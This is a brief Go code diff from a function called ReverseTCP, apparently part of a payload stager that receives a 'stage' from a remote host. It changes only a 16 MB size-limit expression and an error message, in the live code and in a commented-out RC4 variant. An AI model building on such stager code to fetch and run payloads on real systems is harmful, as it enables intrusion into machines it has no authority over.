@@ -29,8 +29,8 @@ func ReverseTCP(network, address, method string) error {
 	if stageSize < 128 {
 		return errors.New("stage is too small that < 128 Byte")
 	}
-	if stageSize > 16<<20 {
-		return errors.New("stage is too big that > 16 MB")
+	if stageSize > 16*1024*1024 {
+		return errors.New("stage is too large that > 16 MB")
 	}
 	// receive stage
 	stage := make([]byte, stageSize)
@@ -70,8 +70,8 @@ func ReverseTCP(network, address, method string) error {
 // 	if stageSize < 128 {
 // 		return errors.New("stage is too small that < 128 Byte")
 // 	}
-// 	if stageSize > 16<<20 {
-// 		return errors.New("stage is too big that > 16 MB")
+// 	if stageSize > 16*1024*1024 {
+// 		return errors.New("stage is too large that > 16 MB")
 // 	}
 // 	// receive stage
 // 	stageRC4 := make([]byte, stageSize)
